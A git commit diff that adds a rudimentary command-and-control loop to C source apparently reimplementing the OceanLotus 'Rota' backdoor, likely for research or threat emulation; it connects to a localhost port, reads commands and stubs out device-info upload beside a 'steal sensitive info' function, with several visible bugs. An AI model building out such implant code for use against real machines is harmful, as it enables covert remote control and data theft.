1081bdcf5673f75f50367d5f36509514f307cc3f
Jared Stroud <1250113+archcloudlabs@users.noreply.github.com>
2023-07-09 20:47:48 -0400

    rudimentary c2 loop up and running

--- ocean_lotus/rota/src/c2_commands.c
+++ ocean_lotus/rota/src/c2_commands.c
@@ -4,20 +4,82 @@
 #include <unistd.h>
 #include <dlfcn.h>
 #include <stdbool.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
 
 #include "c2_commands.h"
 
 
+// https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
 void c2_loop(){
     int sleepy_time = 3;
 
     while (1) {
         printf("(%d) In c2 loop...\n", getpid());
+        const char* server_name = "127.0.0.1";
+        const int server_port = 1234;
+        struct sockaddr_in server_address;
 
+        memset(&server_address, 0, sizeof(server_address));
+        server_address.sin_family = AF_INET;
 
-        sleep(sleepy_time);
+    // creates binary representation of server name
+	// and stores it as sin_addr
+	// http://beej.us/guide/bgnet/output/html/multipage/inet_ntopman.html
+    inet_pton(AF_INET, server_name, &server_address.sin_addr);
+
+    // htons: port in network order format
+    server_address.sin_port = htons(server_port);
+
+	// open a stream socket
+	int sock;
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+		fprintf(stderr, "could not create socket\n");
+	}
+
+	// TCP is connection oriented, a reliable connection
+	// **must** be established before any data is exchanged
+	if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
+		fprintf(stderr, "could not connect to server\n");
+        sleep(3);
+        c2_loop();
+	}
+
+	// send
+
+	// data that will be sent to the server
+	const char* data_to_send = "Initial packet\n";
+	send(sock, data_to_send, strlen(data_to_send), 0);
+	// receive
+
+	int n = 0;
+	int len = 0, maxlen = 100;
+	char buffer[maxlen];
+	//char* pbuffer = buffer;
+
+	// will remain open until the server terminates the connection
+    while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
+        //pbuffer += n;
+        maxlen -= n;
+        len += n;
+
+        //buffer[len] = '\0';
+        printf("received: %s\n", buffer);
+
+        if (strncmp("exit", buffer, 4) == 0) {
+            char *msg = "exiting!";
+            send(sock, msg, strlen(msg), 0);
+            c2_exit();
+        }
+
+        memset(buffer, 0, strlen(buffer));
     }
 
+    // close the socket
+    close(sock);
+    sleep(sleepy_time);
+    }
 }
 
 
@@ -50,8 +112,18 @@ char *c2_steal_sensitive_info() {
 }
 
 
-void c2_upload_device_info() {
+char *c2_upload_device_info() {
     // Netlab 360 make this look like populating a uname struct, /etc/os-relase/etc...
+    struct utsname *hostinfo;
+    char *devinfo;
+    int res  = uname(hostinfo);
+    if (res != 0) {
+        devinfo = (char *)malloc(strlen("unknown"));
+        strncpy(devinfo, "unknown", strlen("unknown"));
+    }
+
+    // TODO - update here with c2 info
+
 }
 
 
